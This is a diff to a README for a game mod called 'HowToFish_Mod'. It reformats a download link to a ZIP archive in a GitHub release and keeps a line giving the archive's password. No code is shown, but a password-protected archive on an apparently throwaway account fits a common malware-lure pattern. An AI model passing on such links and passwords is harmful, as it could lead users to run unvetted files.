@@ -8,8 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](
-https://github.com/artem-wilson-eng91u3/HowToFish_Mod/releases/download/HowToFish/HowToFish_Mod.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/artem-wilson-eng91u3/HowToFish_Mod/releases/download/HowToFish/HowToFish_Mod.zip)
 
 🔐 **Archive password:** **`5868781`**
 
